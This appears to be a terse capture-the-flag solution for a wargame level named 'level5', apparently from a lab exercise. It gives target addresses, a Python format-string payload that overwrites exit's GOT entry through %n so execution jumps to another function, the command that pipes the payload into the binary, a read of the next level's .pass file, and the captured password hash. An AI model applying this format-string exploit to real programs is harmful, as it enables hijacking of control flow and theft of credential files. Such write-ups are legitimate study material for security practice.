level5 :

adress exit n = 08049838
adress o = 080484a4 -> 134513828
offset = 4

python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/tata
cat /tmp/tata - | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
